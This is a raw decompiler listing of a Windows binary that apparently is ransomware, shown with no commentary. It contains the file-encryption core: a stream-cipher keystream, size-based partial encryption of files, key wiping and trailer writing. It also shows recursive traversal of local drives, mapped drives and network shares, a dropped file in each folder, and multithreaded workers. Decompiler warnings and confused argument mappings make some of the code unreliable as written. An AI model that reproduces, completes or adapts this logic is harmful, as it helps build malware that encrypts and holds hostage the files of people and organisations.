              v51 = (*((_DWORD *)&v104[115] + (unsigned __int8)v109 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v109 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[(unsigned int)v11] + (__ROL4__(v99[0].m128i_i32[v11 + 1], 9) ^ __ROL4__(v118, 22)) + __ROL4__(v111, 24));
              v99[0].m128i_i32[(unsigned int)v11] = v51;
              v105 = v51;
              v52 = (*((_DWORD *)&v104[115] + (unsigned __int8)v110 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v110 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11 + 1] + (__ROL4__(v99[0].m128i_i32[(unsigned int)v11 + 2], 9) ^ __ROL4__(LowPart, 22)) + __ROL4__(v112, 24));
              v99[0].m128i_i32[v11 + 1] = v52;
              v106 = v52;
              v53 = (*((_DWORD *)&v104[115] + (unsigned __int8)v111 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v111 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[(unsigned int)v11 + 2] + (__ROL4__(v99[0].m128i_i32[(unsigned int)v11 + 3], 9) ^ __ROL4__(v120, 22)) + __ROL4__(v113, 24));
              v99[0].m128i_i32[(unsigned int)v11 + 2] = v53;
              v107 = v53;
              v54 = (*((_DWORD *)&v104[115] + (unsigned __int8)v112 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v112 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[(unsigned int)v11 + 3] + (__ROL4__(*((_DWORD *)&v100 + (unsigned int)v11), 9) ^ __ROL4__(v105, 22)) + __ROL4__(v114, 24));
              v99[0].m128i_i32[(unsigned int)v11 + 3] = v54;
              v108 = v54;
              v55 = (*((_DWORD *)&v104[115] + (unsigned __int8)v113 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v113 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + (unsigned int)v11) + (__ROL4__(*((_DWORD *)&v100 + (unsigned int)v11 + 1), 9) ^ __ROL4__(v106, 22)) + __ROL4__(v115, 24));
              *((_DWORD *)&v100 + (unsigned int)v11) = v55;
              v109 = v55;
              v56 = (*((_DWORD *)&v104[115] + (unsigned __int8)v114 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v114 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + (unsigned int)v11 + 1) + (__ROL4__(*((_DWORD *)&v100 + (unsigned int)v11 + 2), 9) ^ __ROL4__(v107, 22)) + __ROL4__(v116, 24));
              *((_DWORD *)&v100 + (unsigned int)v11 + 1) = v56;
              v110 = v56;
              v57 = (*((_DWORD *)&v104[115] + (unsigned __int8)v115 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v115 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + (unsigned int)v11 + 2) + (__ROL4__(*((_DWORD *)&v100 + (unsigned int)v11 + 3), 9) ^ __ROL4__(v108, 22)) + __ROL4__(v117, 24));
              *((_DWORD *)&v100 + (unsigned int)v11 + 2) = v57;
              v111 = v57;
              v58 = (*((_DWORD *)&v104[115] + (unsigned __int8)v116 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v116 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + (unsigned int)v11 + 3) + (__ROL4__(*((_DWORD *)&v102[-1] + (unsigned int)v11), 9) ^ __ROL4__(v109, 22)) + __ROL4__(v118, 24));
              *((_DWORD *)&v100 + (unsigned int)v11 + 3) = v58;
              v112 = v58;
              v59 = (*((_DWORD *)&v104[115] + (unsigned __int8)v117 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v117 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v102[-1] + (unsigned int)v11) + (__ROL4__(*((_DWORD *)&v101 + (unsigned int)v11 + 1), 9) ^ __ROL4__(v110, 22)) + __ROL4__(LowPart, 24));
              *((_DWORD *)&v102[-1] + (unsigned int)v11) = v59;
              v113 = v59;
              v60 = (*((_DWORD *)&v104[115] + (unsigned __int8)v118 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v118 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + (unsigned int)v11 + 1) + (__ROL4__(*((_DWORD *)&v101 + (unsigned int)v11 + 2), 9) ^ __ROL4__(v111, 22)) + __ROL4__(v120, 24));
              *((_DWORD *)&v101 + (unsigned int)v11 + 1) = v60;
              v114 = v60;
              v61 = (*((_DWORD *)&v104[115] + (unsigned __int8)LowPart + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)LowPart >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + (unsigned int)v11 + 2) + (__ROL4__(*((_DWORD *)&v101 + (unsigned int)v11 + 3), 9) ^ __ROL4__(v112, 22)) + __ROL4__(v105, 24));
              *((_DWORD *)&v101 + (unsigned int)v11 + 2) = v61;
              v115 = v61;
              v62 = (*((_DWORD *)&v104[115] + (unsigned __int8)v120 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v120 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + (unsigned int)v11 + 3) + (__ROL4__(*((_DWORD *)v102 + (unsigned int)v11), 9) ^ __ROL4__(v113, 22)) + __ROL4__(v106, 24));
              *((_DWORD *)&v101 + (unsigned int)v11 + 3) = v62;
              v116 = v62;
              v63 = (*((_DWORD *)&v104[115] + (unsigned __int8)v105 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v105 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + (unsigned int)v11) + (__ROL4__(*((_DWORD *)v102 + (unsigned int)v11 + 1), 9) ^ __ROL4__(v114, 22)) + __ROL4__(v107, 24));
              *((_DWORD *)v102 + (unsigned int)v11) = v63;
              v117 = v63;
              v64 = (*((_DWORD *)&v104[115] + (unsigned __int8)v106 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v106 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + (unsigned int)v11 + 1) + (__ROL4__(*((_DWORD *)v102 + (unsigned int)v11 + 2), 9) ^ __ROL4__(v115, 22)) + __ROL4__(v108, 24));
              *((_DWORD *)v102 + (unsigned int)v11 + 1) = v64;
              v118 = v64;
              v45.QuadPart = (*((_DWORD *)&v104[115] + (unsigned __int8)v107 + 3)
                            + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v107 >> 14) & 0x3FC) + 12)) ^ (unsigned int)(*((_DWORD *)v102 + (unsigned int)v11 + 2) + (__ROL4__(*((_DWORD *)v102 + (unsigned int)v11 + 3), 9) ^ __ROL4__(v116, 22)) + __ROL4__(v109, 24));
              *((_DWORD *)v102 + (unsigned int)v11 + 2) = v45.LowPart;
              LowPart = v45.LowPart;
              v65 = (*((_DWORD *)&v104[115] + (unsigned __int8)v108 + 3)
                   + *(_DWORD *)((char *)&v104[179] + (((unsigned __int64)v108 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + (unsigned int)v11 + 3) + (__ROL4__(v99[0].m128i_i32[v50], 9) ^ __ROL4__(v117, 22)) + __ROL4__(v110, 24));
              *((_DWORD *)v102 + (unsigned int)v11 + 3) = v65;
              v120 = v65;
            }
            --v48;
          }
          while ( v48 );
          v82 = 1735290724;
          v83 = 0LL;
          do
            v82 = dword_14000E460[HIBYTE(v82) ^ *((unsigned __int8 *)v95 + v83++)] ^ (v82 << 8);
          while ( (_DWORD)v83 != 64 );
          v143 = v82;
          v96[0] = 0;
          do
            v138.m128i_i8[v96[0]++] = 0;
          while ( v96[0] < 0x40u );
          v96[0] = 0;
          do
            *((_BYTE *)v95 + v96[0]++) = 0;
          while ( v96[0] < 0x40u );
          v96[0] = 0;
          do
            *((_BYTE *)v146 + v96[0]++) = 0;
          while ( v96[0] < 0x40u );
          SetFilePointerEx((HANDLE)v11, v45, 0LL, (DWORD)FileW);
          if ( v94 < 20971521 )
          {
            if ( v94 < 5242881 )
            {
              if ( v94 > 0 )
              {
                v11 = 0LL;
                v90 = 0LL;
                v45.QuadPart = (LONGLONG)v93;
                ReadFile(0LL, v93, (DWORD)v20, FileW, (LPOVERLAPPED)(unsigned int)(v94 + 4300));
                sub_14000C600(0LL, (__int64)v93, v20, v99, v20, v93[0]);
                SetFilePointerEx(0LL, (LARGE_INTEGER)v93, 0LL, (DWORD)FileW);
                v90 = 0LL;
                WriteFile(0LL, v93, (DWORD)v20, FileW, (LPOVERLAPPED)v93[0]);
              }
            }
            else
            {
              v11 = (unsigned int)v94 / 5uLL;
              v86 = 3LL;
              v45.QuadPart = (LONGLONG)SetFilePointerEx;
              v87 = 0LL;
              do
              {
                v90 = 0LL;
                ReadFile((HANDLE)v11, SetFilePointerEx, (DWORD)v20, FileW, (LPOVERLAPPED)0x100000);
                sub_14000C600(v11, (__int64)SetFilePointerEx, v20, v99, v20, v93[0]);
                SetFilePointerEx((HANDLE)v11, (LARGE_INTEGER)SetFilePointerEx, v87, (DWORD)FileW);
                v90 = 0LL;
                WriteFile((HANDLE)v11, SetFilePointerEx, (DWORD)v20, FileW, (LPOVERLAPPED)v93[0]);
                v87 = (LARGE_INTEGER *)((char *)v87 + v11);
                SetFilePointerEx((HANDLE)v11, (LARGE_INTEGER)SetFilePointerEx, v87, (DWORD)FileW);
                --v86;
              }
              while ( v86 );
            }
          }
          else
          {
            v84 = (unsigned __int64)v94 >> 20;
            v11 = (unsigned __int64)WriteFile;
            v45.QuadPart = 0LL;
            v85 = 0LL;
            do
            {
              v90 = 0LL;
              ReadFile(WriteFile, (LPVOID)v45.QuadPart, (DWORD)v20, FileW, (LPOVERLAPPED)0x100000);
              sub_14000C600((__int64)WriteFile, v45.QuadPart, v20, v99, v20, v93[0]);
              SetFilePointerEx(WriteFile, v45, (PLARGE_INTEGER)v45.QuadPart, (DWORD)FileW);
              v90 = 0LL;
              WriteFile(WriteFile, (LPCVOID)v45.QuadPart, (DWORD)v20, FileW, (LPOVERLAPPED)0x100000);
              v45.QuadPart += v84;
              SetFilePointerEx(WriteFile, v45, (PLARGE_INTEGER)v45.QuadPart, (DWORD)FileW);
              ++v85;
            }
            while ( v84 != v85 );
          }
          v96[0] = 0;
          do
            v99[0].m128i_i8[v96[0]++] = 0;
          while ( v96[0] < 0x10CCu );
          SetFilePointerEx((HANDLE)v11, v45, 0LL, (DWORD)FileW);
          v90 = 0LL;
          WriteFile((HANDLE)v11, (LPCVOID)v45.QuadPart, (DWORD)v142, FileW, (LPOVERLAPPED)0x48);
          GetProcessHeap();
          HeapFree((HANDLE)v11, v45.LowPart, 0LL);
        }
        LODWORD(v15) = CloseHandle((HANDLE)v11);
      }
    }
  }
  return (int)v15;
}
// 140007A2A: positive sp value 1298 has been found
// 1400066BC: variable 'v14' is possibly undefined
// 140006764: variable 'v18' is possibly undefined
// 1400067B2: variable 'v21' is possibly undefined
// 1400067B2: variable 'v22' is possibly undefined
// 1400067C9: variable 'v23' is possibly undefined
// 1400067C9: variable 'v24' is possibly undefined
// 14000D3A0: using guessed type __int128 xmmword_14000D3A0;
// 14000D3B0: using guessed type __int128 xmmword_14000D3B0;
// 14000D430: using guessed type __int128 xmmword_14000D430;
// 14000D440: using guessed type __int128 xmmword_14000D440;
// 14000E460: using guessed type _DWORD dword_14000E460[1];
// 1400110A0: using guessed type unsigned __int16 word_1400110A0[16];
// 140006644: using guessed type __m128i anonymous_6[12];

//----- (0000000140007A2B) ----------------------------------------------------
int __fastcall Z16fe7bb5bd884a4b05PKw(
        WCHAR *a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        double a5,
        double a6,
        double a7,
        double a8,
        double a9,
        double a10,
        __m128 a11)
{
  const WCHAR *v12; // rax
  WCHAR *v13; // rsi
  WCHAR *FileW; // rax
  __int64 v15; // rbx
  __int64 v16; // rax
  WCHAR *v17; // rcx
  struct _RTL_CRITICAL_SECTION *v19; // rax
  __int64 v20; // rdx
  double v21; // xmm4_8
  double v22; // xmm5_8
  void *v24; // [rsp+0h] [rbp-2E8h]
  struct _RTL_CRITICAL_SECTION v25; // [rsp+3Ch] [rbp-2ACh] BYREF
  WCHAR String1[306]; // [rsp+84h] [rbp-264h] BYREF

  v12 = (const WCHAR *)sub_14000878B((__int64)a1, a2, a3, 0x10000);
  if ( v12 )
  {
    v13 = (WCHAR *)v12;
    lstrcpyW(a1, v12);
    lstrcatW(a1, v13);
    FileW = (WCHAR *)CreateFileW(a1, (DWORD)v13, 0x40000000u, (LPSECURITY_ATTRIBUTES)v13, 1u, 0, v24);
    if ( FileW != (WCHAR *)-1LL )
    {
      a1 = FileW;
      WriteFile(FileW, v13, (DWORD)&nNumberOfBytesToWrite, (LPDWORD)FileW, (LPOVERLAPPED)0xF95);
      CloseHandle(a1);
    }
    lstrcpyW(a1, v13);
    lstrcatW(a1, v13);
    *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v25.DebugInfo + 4) = (PRTL_CRITICAL_SECTION_DEBUG)FindFirstFileW(
                                                                                                  a1,
                                                                                                  (LPWIN32_FIND_DATAW)v13);
    if ( *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v25.DebugInfo + 4) != (PRTL_CRITICAL_SECTION_DEBUG)-1LL )
    {
      *(_QWORD *)&v25.RecursionCount = a4;
      a1 = String1;
      v15 = 0LL;
      while ( 1 )
      {
        while ( !lstrcmpiW(String1, v13) )
        {
LABEL_20:
          v15 = 0LL;
          if ( !FindNextFileW(String1, (LPWIN32_FIND_DATAW)v13) )
          {
            FindClose(String1);
            goto LABEL_22;
          }
        }
        if ( ++v15 == 27 )
        {
          lstrcpyW(String1, v13);
          lstrcatW(String1, v13);
          lstrcatW(String1, v13);
          if ( (BYTE4(v25.LockSemaphore) & 0x10) == 0 && lstrcmpW(String1, v13) )
          {
            v16 = lstrlenW(String1);
            v17 = &String1[(int)v16];
            do
            {
              if ( v16 <= 0 )
                goto LABEL_16;
              --v16;
            }
            while ( *--v17 != 46 );
            if ( lstrcmpiW(String1, v13) && lstrcmpiW(String1, v13) && lstrcmpiW(String1, v13) )
            {
LABEL_16:
              while ( !(unsigned int)sub_140008827(
                                       (__int64)String1,
                                       (__int64)v13,
                                       (struct _RTL_CRITICAL_SECTION *)v13,
                                       (__int64)&unk_140012158,
                                       0) )
              {
                LODWORD(v25.DebugInfo) = 0;
                while ( 1 )
                {
                  v19 = sub_140008900((__int64)String1, (__int64)v13, 0, (__int64)&unk_140012158, &v25);
                  if ( !v19 )
                    break;
                  Z17_e3cc5b58c71c8439Pw(
                    a5,
                    a6,
                    a7,
                    a8,
                    v21,
                    v22,
                    a11,
                    (__int64)String1,
                    (__int64)v13,
                    v20,
                    (const WCHAR *)v19);
                  GetProcessHeap();
                  HeapFree(String1, (DWORD)v13, 0LL);
                }
              }
              goto LABEL_20;
            }
          }
          goto LABEL_20;
        }
      }
    }
LABEL_22:
    GetProcessHeap();
    LODWORD(v12) = HeapFree(a1, (DWORD)v13, 0LL);
  }
  return (int)v12;
}
// 140007A9D: variable 'v24' is possibly undefined
// 140007C3F: variable 'v21' is possibly undefined
// 140007C3F: variable 'v22' is possibly undefined
// 140007C3F: variable 'v20' is possibly undefined
// 140007A2B: using guessed type WCHAR String1[306];

//----- (0000000140007CA5) ----------------------------------------------------
int __fastcall Z16d813fb2f7e16258aPw(
        WCHAR *a1,
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        __m128 a8,
        __int64 a9,
        __int64 a10,
        struct _RTL_CRITICAL_SECTION *a11)
{
  __int64 v12; // rdx
  struct _RTL_CRITICAL_SECTION *v13; // rax
  __int64 v14; // rdx
  double v15; // xmm4_8
  double v16; // xmm5_8
  const WCHAR *v17; // rax
  WCHAR *v18; // rsi
  __int64 v19; // r15
  __int64 v20; // rdx
  struct _RTL_CRITICAL_SECTION dwFlags; // [rsp+34h] [rbp-294h] BYREF
  WCHAR String1[306]; // [rsp+64h] [rbp-264h] BYREF

  while ( !(unsigned int)sub_140008827((__int64)a1, (__int64)&dwFlags, a11, (__int64)&Handles, 0) )
  {
    while ( 1 )
    {
      v13 = sub_140008900((__int64)a1, (__int64)&dwFlags, 0, (__int64)&unk_140012158, &dwFlags);
      if ( !v13 )
        break;
      a1 = (WCHAR *)v13;
      Z17_e3cc5b58c71c8439Pw(a2, a3, a4, a5, v15, v16, a8, (__int64)v13, (__int64)&dwFlags, v14, (const WCHAR *)v13);
      GetProcessHeap();
      HeapFree(a1, (DWORD)&dwFlags, 0LL);
    }
  }
  v17 = (const WCHAR *)sub_14000878B((__int64)a1, (__int64)&dwFlags, v12, 0x10000);
  if ( v17 )
  {
    v18 = (WCHAR *)v17;
    lstrcpyW(a1, v17);
    lstrcatW(a1, v18);
    if ( FindFirstFileW(a1, (LPWIN32_FIND_DATAW)v18) != (HANDLE)-1LL )
    {
      a1 = String1;
      do
      {
        if ( (BYTE4(dwFlags.DebugInfo) & 0x10) != 0 )
        {
          v19 = 0LL;
          while ( lstrcmpiW(String1, (LPCWSTR)FindNextFileW) )
          {
            v19 += 8LL;
            if ( v19 == 216 )
            {
              lstrcpyW(String1, (LPCWSTR)FindNextFileW);
              lstrcatW(String1, (LPCWSTR)FindNextFileW);
              lstrcatW(String1, (LPCWSTR)FindNextFileW);
              Z16d813fb2f7e16258aPw(String1, FindNextFileW, v20, v18);
              break;
            }
          }
        }
      }
      while ( FindNextFileW(String1, (LPWIN32_FIND_DATAW)FindNextFileW) );
      FindClose(String1);
    }
    GetProcessHeap();
    LODWORD(v17) = HeapFree(a1, (DWORD)v18, 0LL);
  }
  return (int)v17;
}
// 140007D06: variable 'v15' is possibly undefined
// 140007D06: variable 'v16' is possibly undefined
// 140007D06: variable 'v14' is possibly undefined
// 140007D1F: variable 'v12' is possibly undefined
// 140007DDC: variable 'v20' is possibly undefined

//----- (0000000140007E26) ----------------------------------------------------
void __fastcall __noreturn sub_140007E26(
        double a1,
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        __m128 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        __int64 a11)
{
  struct _RTL_CRITICAL_SECTION *p_hHeap; // rdi
  struct _RTL_CRITICAL_SECTION *v12; // rax
  __int64 v13; // rdx
  double v14; // xmm4_8
  double v15; // xmm5_8
  struct _RTL_CRITICAL_SECTION *v16; // rax
  __int64 v17; // rdx
  double v18; // xmm4_8
  double v19; // xmm5_8
  struct _RTL_CRITICAL_SECTION *v20; // rax
  __int64 v21; // rdx
  double v22; // xmm4_8
  double v23; // xmm5_8
  struct _RTL_CRITICAL_SECTION hHeap; // [rsp+24h] [rbp-34h] BYREF

  LODWORD(hHeap.DebugInfo) = 0;
  if ( a11 )
  {
    p_hHeap = &hHeap;
    while ( 1 )
    {
      v16 = sub_140008900((__int64)&hHeap, a9, 0, (__int64)&Handles, &hHeap);
      if ( v16 )
      {
        a9 = (__int64)v16;
        Z16fe7bb5bd884a4b05PKw((WCHAR *)&hHeap, (__int64)v16, v17, (__int64)v16, a1, a2, a3, a4, v18, v19, a7);
        goto LABEL_10;
      }
      if ( LODWORD(hHeap.DebugInfo) != -1 )
        break;
      while ( 1 )
      {
        v20 = sub_140008900((__int64)&hHeap, a9, 0, (__int64)&unk_140012158, &hHeap);
        if ( !v20 )
          break;
        a9 = (__int64)v20;
        Z17_e3cc5b58c71c8439Pw(a1, a2, a3, a4, v22, v23, a7, (__int64)&hHeap, (__int64)v20, v21, (const WCHAR *)v20);
LABEL_10:
        GetProcessHeap();
        HeapFree(&hHeap, a9, 0LL);
      }
    }
  }
  else
  {
    LODWORD(p_hHeap) = (_DWORD)HeapFree;
    while ( 1 )
    {
      v12 = sub_140008900((__int64)HeapFree, (__int64)GetProcessHeap, 1, (__int64)&unk_140012158, &hHeap);
      if ( !v12 )
        break;
      Z17_e3cc5b58c71c8439Pw(
        a1,
        a2,
        a3,
        a4,
        v14,
        v15,
        a7,
        (__int64)HeapFree,
        (__int64)GetProcessHeap,
        v13,
        (const WCHAR *)v12);
      GetProcessHeap();
      HeapFree(HeapFree, (DWORD)GetProcessHeap, 0LL);
    }
  }
  ExitThread((DWORD)p_hHeap);
}
// 140007E79: variable 'v14' is possibly undefined
// 140007E79: variable 'v15' is possibly undefined
// 140007E79: variable 'v13' is possibly undefined
// 140007EC5: variable 'v17' is possibly undefined
// 140007EC5: variable 'v18' is possibly undefined
// 140007EC5: variable 'v19' is possibly undefined
// 140007EFB: variable 'v22' is possibly undefined
// 140007EFB: variable 'v23' is possibly undefined
// 140007EFB: variable 'v21' is possibly undefined
// 140007E26: using guessed type struct _RTL_CRITICAL_SECTION hHeap;

//----- (0000000140007F0B) ----------------------------------------------------
DWORD __fastcall Z16fbddd3ee5768b27aP13_NETRESOURCEW(
        WCHAR *a1,
        __int64 a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        double a8,
        __m128 a9)
{
  DWORD result; // eax
  __int64 v10; // rdx
  WCHAR *v11; // rax
  __int64 v12; // rdx
  double v13; // xmm4_8
  double v14; // xmm5_8
  unsigned __int64 v15; // rbx
  int Buffer[2]; // [rsp+30h] [rbp-38h] BYREF
  LPDWORD lpBufferSize; // [rsp+38h] [rbp-30h]

  Buffer[0] = -1;
  Buffer[1] = 0x4000;
  result = WNetOpenEnumW((DWORD)a1, a2, 0, (LPNETRESOURCEW)2, (LPHANDLE)0x13);
  if ( !result )
  {
    v11 = (WCHAR *)sub_14000878B((__int64)a1, a2, v10, 0x4000);
    if ( v11 )
    {
      a1 = v11;
      while ( !WNetEnumResourceW(a1, (LPDWORD)a2, Buffer, lpBufferSize) )
      {
        if ( Buffer[0] )
        {
          a2 = (__int64)a1;
          v15 = 0LL;
          do
          {
            if ( (*(_BYTE *)(a2 + 12) & 2) != 0 )
              Z16fbddd3ee5768b27aP13_NETRESOURCEW(a1, a2, v12, a2);
            else
              Z16d813fb2f7e16258aPw(
                a1,
                a3,
                a4,
                a5,
                a6,
                v13,
                v14,
                a9,
                a2,
                v12,
                *(struct _RTL_CRITICAL_SECTION **)(a2 + 24));
            ++v15;
            a2 += 48LL;
          }
          while ( v15 < (unsigned int)Buffer[0] );
        }
      }
      GetProcessHeap();
      HeapFree(a1, a2, 0LL);
    }
    return WNetCloseEnum(a1);
  }
  return result;
}
// 140007F52: variable 'v10' is possibly undefined
// 140007F96: variable 'v13' is possibly undefined
// 140007F96: variable 'v14' is possibly undefined
// 140007F96: variable 'v12' is possibly undefined

//----- (0000000140007FE2) ----------------------------------------------------
DWORD __fastcall Z16d2816ea60753364fPKw(__int64 a1, __int64 a2, __int64 a3, DWORD a4)
{
  DWORD result; // eax
  DWORD v6; // ebp
  DWORD *v7; // [rsp+0h] [rbp-158h]
  DWORD entriesread[2]; // [rsp+48h] [rbp-110h] BYREF
  WCHAR servername[132]; // [rsp+50h] [rbp-108h] BYREF

  do
  {
    result = NetShareEnum(servername, a4, (LPBYTE *)1, a4, entriesread, (LPDWORD)0xFFFFFFFFLL, v7);
    v6 = result;
    if ( result != 234 && result )
      break;
    result = NetApiBufferFree(servername);
  }
  while ( v6 == 234 );
  return result;
}
// 140008059: variable 'v7' is possibly undefined

//----- (000000014000811D) ----------------------------------------------------
int __fastcall Z17_da736ccd2972c524w(
        double a1,
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        __m128 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        unsigned int a11)
{
  __int64 v11; // rdi
  const WCHAR *v12; // rax
  __int64 v13; // rsi
  UINT DriveTypeW; // eax
  __int64 v15; // rdx
  double v16; // xmm4_8
  double v17; // xmm5_8
  WCHAR *v18; // rax
  __int64 v19; // rdx
  double v20; // xmm4_8
  double v21; // xmm5_8

  v11 = a11;
  v12 = (const WCHAR *)sub_14000878B(a11, a9, a10, 14);
  if ( v12 )
  {
    v13 = (__int64)v12;
    lstrcpyW((LPWSTR)v11, v12);
    lstrcpyW((LPWSTR)v11, (LPCWSTR)v13);
    *(_WORD *)(v13 + 8) = v11;
    DriveTypeW = GetDriveTypeW((LPCWSTR)v11);
    if ( DriveTypeW )
    {
      if ( DriveTypeW == 4 )
      {
        v18 = (WCHAR *)sub_14000878B(v11, v13, v15, 520);
        if ( v18 )
        {
          v11 = (__int64)v18;
          if ( !WNetGetConnectionW(v18, (LPWSTR)v13, (LPDWORD)v18) )
            Z16d813fb2f7e16258aPw(
              (WCHAR *)v11,
              a1,
              a2,
              a3,
              a4,
              v20,
              v21,
              a7,
              v13,
              v19,
              (struct _RTL_CRITICAL_SECTION *)v11);
          GetProcessHeap();
          HeapFree((HANDLE)v11, v13, 0LL);
        }
      }
      else if ( DriveTypeW != 5 )
      {
        Z16d813fb2f7e16258aPw((WCHAR *)v11, a1, a2, a3, a4, v16, v17, a7, v13, v15, (struct _RTL_CRITICAL_SECTION *)v13);
      }
    }
    GetProcessHeap();
    LODWORD(v12) = HeapFree((HANDLE)v11, v13, 0LL);
  }
  return (int)v12;
}
// 14000817A: variable 'v16' is possibly undefined
// 14000817A: variable 'v17' is possibly undefined
// 14000817A: variable 'v15' is possibly undefined
// 1400081B6: variable 'v20' is possibly undefined
// 1400081B6: variable 'v21' is possibly undefined
// 1400081B6: variable 'v19' is possibly undefined

//----- (00000001400081EC) ----------------------------------------------------
void __fastcall __noreturn Z12initCallbackPw(
        HCRYPTPROV a1,
        const WCHAR *a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        double a8,
        __m128 a9)
{
  __int64 v9; // r15
  unsigned __int64 v10; // rsi
  __int64 v11; // rdx
  _BYTE *v12; // r13
  __int64 v13; // rdx
  _BYTE *v14; // rax
  _BYTE *v15; // r12
  struct _SECURITY_ATTRIBUTES *v16; // rdi
  __int64 v17; // rsi
  LPWSTR *v18; // rdi
  _WORD *v19; // rbx
  WCHAR *v20; // rdi
  int v21; // eax
  int v22; // ebp
  __int64 k; // rcx
  int v24; // eax
  __int64 v25; // rdx
  __int64 v26; // rdx
  bool v27; // al
  int v28; // eax
  int v29; // r14d
  __int64 m; // rcx
  int v31; // eax
  __int64 v32; // rdx
  WCHAR *v33; // rdi
  __int64 v34; // rdx
  double v35; // xmm4_8
  double v36; // xmm5_8
  bool v37; // zf
  int v38; // ebx
  BOOL v39; // r14d
  BOOL v40; // ebp
  WCHAR *v41; // rdi
  LPWSTR *v42; // r15
  double v43; // xmm4_8
  double v44; // xmm5_8
  __int64 v45; // rcx
  DWORD LogicalDrives; // eax
  __int64 v47; // rdx
  double v48; // xmm4_8
  double v49; // xmm5_8
  __int64 v50; // rcx
  WCHAR *v51; // rsi
  __int64 v52; // rbx
  __int64 v53; // rsi
  int i; // [rsp+38h] [rbp-A0h]
  int j; // [rsp+38h] [rbp-A0h]
  int pNumArgs; // [rsp+3Ch] [rbp-9Ch] BYREF
  DWORD dwDesiredAccess[2]; // [rsp+40h] [rbp-98h]
  LPWSTR *v58; // [rsp+48h] [rbp-90h]
  BOOL bWaitAll[2]; // [rsp+50h] [rbp-88h]
  BOOL v60[2]; // [rsp+58h] [rbp-80h]
  __int64 v61; // [rsp+60h] [rbp-78h]
  _QWORD dwProvType[4]; // [rsp+68h] [rbp-70h] BYREF
  unsigned int v63; // [rsp+88h] [rbp-50h]

  sub_140001620(a1, (__int64)a2);
  qword_140012200 = (__int64)GetProcessHeap();
  dwProvType[0] = 0LL;
  if ( CryptAcquireContextW((HCRYPTPROV *)a1, a2, 0LL, (DWORD)dwProvType, 0)
    || CryptAcquireContextW((HCRYPTPROV *)a1, a2, 0LL, (DWORD)dwProvType, 0) )
  {
    qword_140012150 = dwProvType[0];
    if ( dwProvType[0] )
    {
      pNumArgs = 0;
      GetCommandLineW();
      v58 = CommandLineToArgvW(0LL, &pNumArgs);
      SetProcessShutdownParameters(0, (DWORD)&pNumArgs);
      CreateThread(0LL, (SIZE_T)&pNumArgs, 0LL, 0LL, (DWORD)sub_140009170, 0LL);
      Z17_f748c24884dd5699v(0LL);
      Z17_c32ef15adecfbcf9v(0LL, (DWORD)&pNumArgs);
      Z17_a94acad879016c13v(0LL, (const CHAR *)&pNumArgs);
      GetSystemInfo(0LL);
      v9 = v63;
      a1 = (2 * v63) & 0x7FFFFFFE;
      sub_1400087C3(a1, (__int64)dwProvType, 24 * v63, (__int64)&unk_140012158);
      sub_1400087C3(a1, (__int64)dwProvType, (unsigned int)(3 * a1), (__int64)&Handles);
      v10 = 8 * a1;
      v12 = sub_14000878B(a1, 8 * a1, v11, 8 * (int)a1);
      v14 = sub_14000878B(a1, 8 * a1, v13, 8 * (int)a1);
      if ( v12 )
      {
        v15 = v14;
        if ( v14 )
        {
          for ( i = 0; v10 > i; ++i )
            v12[i] = 0;
          for ( j = 0; v10 > j; ++j )
            v14[j] = 0;
          *(_QWORD *)dwDesiredAccess = (2 * (_DWORD)v9) & 0x7FFFFFFE;
          if ( (_DWORD)a1 )
          {
            v16 = 0LL;
            do
            {
              *(_QWORD *)((char *)&v16->nLength + (_QWORD)v12) = CreateThread(
                                                                   v16,
                                                                   (SIZE_T)sub_140007E26,
                                                                   0LL,
                                                                   0LL,
                                                                   (DWORD)sub_140007E26,
                                                                   (LPDWORD)1);
              *(_QWORD *)((char *)&v16->nLength + (_QWORD)v15) = CreateThread(
                                                                   v16,
                                                                   (SIZE_T)sub_140007E26,
                                                                   0LL,
                                                                   0LL,
                                                                   (DWORD)sub_140007E26,
                                                                   0LL);
              v16 = (struct _SECURITY_ATTRIBUTES *)((char *)v16 + 8);
            }
